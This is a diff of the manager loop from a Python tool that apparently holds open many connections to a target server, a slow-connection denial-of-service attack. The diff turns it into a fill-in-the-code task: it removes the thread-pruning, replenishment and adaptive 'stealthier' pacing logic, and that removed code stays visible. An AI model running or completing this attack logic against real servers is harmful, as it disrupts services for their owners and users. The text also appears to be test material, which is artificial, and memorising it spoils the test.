@@ -107,27 +107,18 @@ def main():
         # This is the main manager loop
         while not stop_event.is_set():
             # Get an accurate count of currently active connections by pruning dead threads
-            num_before_prune = len(threads)
-            threads = [t for t in threads if t.is_alive()]
-            num_after_prune = len(threads)
-            
-            dropped_count = num_before_prune - num_after_prune
+            # FILL CODE HERE
             
             # --- DYNAMIC PACING LOGIC ---
             # If the server is aggressively dropping our connections (more than 10% of our pool),
             # we decrease the sleep interval to send keep-alives more frequently.
-            if dropped_count > (args.connections * 0.1):
-                attack_state.set_sleep(max(5, attack_state.get_sleep() - 5))
+            # FILL CODE HERE
             # If connections are stable, we can be stealthier by slowly increasing the sleep interval.
-            elif dropped_count == 0 and attack_state.get_sleep() < args.sleep:
-                attack_state.set_sleep(attack_state.get_sleep() + 1)
+            # FILL CODE HERE
             # --------------------------
 
             # Replenishment: If the number of active threads is below our target, start new ones.
-            while len(threads) < args.connections:
-                worker = SocketWorker(args.hostname, args.port, args.header_size, attack_state)
-                worker.start()
-                threads.append(worker)
+            # FILL CODE HERE
 
             # Print a status update every second
             print(f"[*] Active connections: {len(threads)} / {args.connections} | Dropped: {dropped_count} | Pace: ~{attack_state.get_sleep()}s")
